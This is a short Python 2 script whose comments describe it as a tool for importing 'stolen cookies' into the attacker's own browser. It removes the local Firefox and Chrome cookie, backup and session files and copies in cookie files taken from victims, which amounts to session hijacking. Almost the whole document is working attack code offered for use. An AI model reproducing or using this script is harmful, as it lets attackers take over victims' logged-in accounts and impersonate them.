#
# This script is used to import stolen cookies into their personal Firefox profile
# MAKE SURE YOUR BROWSER IS CLOSED
# If the script detects cookies to import, it will delete and prepare files for an import of stolen cookies.
#

import os
import shutil
import BrowserConstants

appDataDir = BrowserConstants.appDataDir #Storing the %Appdata% directory

firefoxCookieFile = BrowserConstants.firefoxCookieFile  #Cook file to search for in the Firefox directory
firefoxCookieFileBackup = BrowserConstants.firefoxCookieFileBackup  #Cookie file has a backup that must be accounted for
firefoxCookieFileBackupRe = BrowserConstants.firefoxCookieFileBackupRe  #Cookie file has a backup that must be accounted for
firefoxSessionCookies = BrowserConstants.firefoxSessionCookies #These are session cookies thatmust be accounted for

chromeCookieFile = BrowserConstants.chromeCookieFile
chromeCookieJournal = BrowserConstants.chromeCookieJournal
chromeSessionCookies = BrowserConstants.chromeSessionCookies

#
# First is checking if we have stolen Firefox cookies, then importing if we do
#

if(os.path.exists('exportedCookies\Firefox\\' + firefoxCookieFile)):
	if(os.path.isdir(appDataDir + "\Mozilla") and os.path.isdir(appDataDir + "\Mozilla\Firefox")): #Checking if Firefox is installed
		
		firefoxProfile = os.listdir(appDataDir + "\Mozilla\Firefox\Profiles")[0] #Storing the Firefox profile found in the Firefox directory
		firefoxPathToCookies = appDataDir + '\Mozilla\Firefox\Profiles\\' +firefoxProfile #Storing the whole directory path to the cookies

		if(os.path.isdir(firefoxPathToCookies)):  #Checking if building the path to the cookies exists

			if(os.path.exists(firefoxPathToCookies + "\\" + firefoxCookieFile)):  #Checking if the cookie files has been found
				os.remove(firefoxPathToCookies + "\\" + firefoxCookieFile) #Delete the cookie file
			if(os.path.exists(firefoxPathToCookies + "\\" + firefoxCookieFileBackup)): #Check for cookie file backup
				os.remove(firefoxPathToCookies + "\\" + firefoxCookieFileBackup) #Delete the cookie file backup
			if(os.path.exists(firefoxPathToCookies + "\\" + firefoxCookieFileBackupRe)): #Check for the second back up
				os.remove(firefoxPathToCookies + "\\" + firefoxCookieFileBackupRe) #Delete the second backup
			if(os.path.exists(firefoxPathToCookies + "\\" + firefoxSessionCookies)): #Check for session cookies
				os.remove(firefoxPathToCookies + "\\" + firefoxSessionCookies) #Delete the session cookies

			shutil.copy2('exportedCookies\Firefox\\' + firefoxCookieFile, firefoxPathToCookies + "\\" + firefoxCookieFile)  #Import the Firefox cookies
		else:
			print "Error computing Firefox user profile."
	else: 
		print "User does not have Firefox installed."
else:
	print "No Firefox cookies to import."

#
# Second is checking if we have stolen Chrome cookies, then importing if we do
#

if(os.path.exists('exportedCookies\Chrome\\' + chromeCookieFile)):
	if(os.path.isdir(appDataDir + "\..\Local\Google\Chrome")): #Checking if Chrome is installed
		
		chromePathToCookies = appDataDir + '\..\Local\Google\Chrome\User Data\Default' #Storing the whole directory path to the cookies

		if(os.path.isdir(chromePathToCookies)):  #Checking if building the path to the cookies exists

			if(os.path.exists(chromePathToCookies + "\\" + chromeCookieFile)):   #Checking for a cookie file
				os.remove(chromePathToCookies + "\\" + chromeCookieFile)  #Delete the cookie file
			if(os.path.exists(chromePathToCookies + "\\" + chromeCookieJournal)):  #Checking for a cookie journal
				os.remove(chromePathToCookies + "\\" + chromeCookieJournal)  #Delete the cookie journal
			if(os.path.exists(chromePathToCookies + "\\" + chromeSessionCookies)):  #Checking for session cookies
				os.remove(chromePathToCookies + "\\" + chromeSessionCookies)  #Delete the session cookies

			shutil.copy2('exportedCookies\Chrome\\' + chromeCookieFile, chromePathToCookies + "\\" + chromeCookieFile)
		else:
			print "Error computing Chrome user profile."
	else: 
		print "User does not have Chrome installed."
else:
	print "No Chrome cookies to import."